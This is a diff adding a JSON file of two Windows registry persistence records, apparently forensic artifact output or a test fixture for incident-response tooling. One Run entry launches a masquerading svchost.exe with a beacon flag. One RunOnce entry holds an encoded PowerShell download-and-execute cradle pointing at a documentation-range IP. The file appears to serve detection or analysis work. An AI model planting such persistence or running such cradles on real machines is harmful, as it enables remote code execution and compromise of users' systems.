@@ -1,0 +1,20 @@
+[
+  {
+    "Key": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "ValueName": "SecurityUpdateService",
+    "ValueData": "C:\\Users\\Public\\svchost.exe --beacon",
+    "Type": "REG_SZ",
+    "Mtime": "2026-09-18T10:16:20.000000Z",
+    "Username": "NT AUTHORITY\\SYSTEM",
+    "Artifact": "Windows.Persistence.Registry"
+  },
+  {
+    "Key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+    "ValueName": "UpdaterTask",
+    "ValueData": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADQANAA6ADgAMAA4ADAALwBiAC4AcABzADEAJwApAA==",
+    "Type": "REG_SZ",
+    "Mtime": "2026-09-18T10:16:25.000000Z",
+    "Username": "DEV\\Alice",
+    "Artifact": "Windows.Persistence.Registry"
+  }
+]
